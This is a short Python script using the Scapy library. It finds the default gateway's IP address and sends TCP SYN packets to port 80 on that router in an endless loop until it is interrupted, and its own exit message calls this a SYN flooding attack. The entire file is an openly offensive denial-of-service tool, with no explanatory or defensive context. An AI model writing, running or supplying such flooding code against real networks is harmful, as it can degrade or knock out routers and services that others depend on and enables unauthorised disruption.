from scapy.all import IP, TCP, send, conf
import time


def get_router_ip():
    # Reads the default IPv4 route from the OS routing table
    return conf.route.route("0.0.0.0")[2]


print(f"Router IP Address: {get_router_ip()}")

ip_layer = IP(dst=get_router_ip())
tcp_layer = TCP(dport=80, flags="S")  # SYN flag set
syn_packet = ip_layer / tcp_layer

try:
    while True:
        send(syn_packet)
        time.sleep(0.1)
except KeyboardInterrupt:
    print("Stopped SYN flooding attack")
